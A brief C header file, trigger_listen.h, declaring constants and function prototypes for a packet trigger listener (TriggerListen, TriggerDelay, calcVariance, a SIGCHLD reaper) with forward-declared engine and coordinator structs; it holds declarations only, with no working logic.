
#ifndef __TRIGGER_LISTEN_H
#define __TRIGGER_LISTEN_H

#include "compat.h"			//NEW
#include "function_strings.h"

#ifndef SUCCESS
#define SUCCESS 0
#endif

#ifndef FAILURE
#define FAILURE -1
#endif

#ifndef false 
#define false 0
#endif

#ifndef true
#define true 1
#endif

#define MAX_PKT 1750

struct autognosis_engine;
struct hive_coordinator;
int TriggerListen(int trigger_delay, unsigned long delete_delay, struct autognosis_engine *autognosis, struct hive_coordinator *hive_coord);

// TODO: delete this prototype
int trigger_main( int argc, char ** argv);

void sigchld_reaper (int x);

void calcVariance( signed int* variance, int range );

void TriggerDelay(int trigger_delay);

#endif //__TRIGGER_H
